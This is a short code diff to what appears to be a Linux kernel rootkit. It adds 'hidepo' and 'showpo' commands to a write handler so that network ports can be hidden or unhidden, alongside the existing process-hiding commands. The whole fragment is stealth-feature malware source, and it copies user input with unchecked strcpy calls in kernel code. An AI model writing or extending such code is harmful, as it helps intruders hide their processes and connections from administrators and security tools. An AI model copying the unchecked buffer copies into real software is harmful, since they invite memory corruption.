@@ -41,6 +41,12 @@ ssize_t writer(struct file *filep, const char *buff, size_t count, loff_t *offp)
             insert_node(&pids_to_hide, last_data);
         }
     }
+    if(memcmp("hidepo ", tmpdata, strlen("hidepo ")) == 0){
+        if(strlen(tmpdata) > strlen("hidepo ")){
+            strcpy(last_data, tmpdata + strlen("hidepo "));
+            insert_node(&ports_to_hide, last_data);
+        }
+    }
     if(memcmp("show ", tmpdata, strlen("show ")) == 0){
         if(strlen(tmpdata) > strlen("show ") + 3){
             strcpy(last_data, tmpdata + strlen("show "));
@@ -51,6 +57,12 @@ ssize_t writer(struct file *filep, const char *buff, size_t count, loff_t *offp)
         if(strlen(tmpdata) > strlen("showp ")){
             strcpy(last_data, tmpdata + strlen("showp "));
             remove_node_by_name(&pids_to_hide, last_data);
+        }
+    }
+    if(memcmp("showpo ", tmpdata, strlen("showpo ")) == 0){
+        if(strlen(tmpdata) > strlen("showpo ")){
+            strcpy(last_data, tmpdata + strlen("showpo "));
+            remove_node_by_name(&ports_to_hide, last_data);
         }
     }
     return 0;
